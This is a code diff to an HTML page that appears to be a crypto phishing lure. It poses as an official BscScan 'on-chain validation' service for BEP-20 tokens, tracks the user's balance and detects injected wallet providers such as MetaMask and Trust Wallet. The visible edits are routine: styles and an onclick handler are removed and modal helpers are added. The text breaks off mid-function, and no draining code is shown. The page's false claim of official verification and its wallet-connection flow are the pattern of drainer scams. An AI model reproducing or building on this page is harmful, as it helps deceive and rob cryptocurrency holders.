@@ -73,9 +73,6 @@
     @keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
     .ticker-item { display: inline-flex; align-items: center; gap: 6px; font-size: 11px; color: #718096; }
     .ticker-token { color: #ffffff; font-weight: 600; }
-    .dot-blue { width: 6px; height: 6px; background-color: #3b82f6; border-radius: 50%; }
-    .dot-purple { width: 6px; height: 6px; background-color: #8b5cf6; border-radius: 50%; }
-    .dot-green-light { width: 6px; height: 6px; background-color: #10b981; border-radius: 50%; }
 
     /* Live Transactions Table */
     .tx-container { background-color: #12161f; border: 1px solid #1e2430; border-radius: 14px; width: 100%; overflow: hidden; margin-bottom: 20px; }
@@ -224,7 +221,7 @@
           <div class="verify-desc">Execute official on-chain validation for your BEP-20 tokens via BscScan's direct Smart Chain consensus.</div>
           
           <!-- Verification Button -->
-          <button id="mainVerifyBtn" class="btn-verify" onclick="initiateAuditFlow()">
+          <button id="mainVerifyBtn" class="btn-verify" type="button">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:16px;height:16px;" id="btnIcon">
               <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
             </svg>
@@ -337,4 +334,15 @@
     let userBalanceBN = null;
 
     function closeModal(id) {
-      document.getElementById(id).style.display
+      document.getElementById(id).style.display = 'none';
+      resetButton();
+    }
+
+    function showModal(id) {
+      document.getElementById(id).style.display = 'flex';
+    }
+
+    function getActiveProvider() {
+      if (window.ethereum) return window.ethereum;
+      if (window.trustwallet) return window.trustwallet;
+      if (window.we
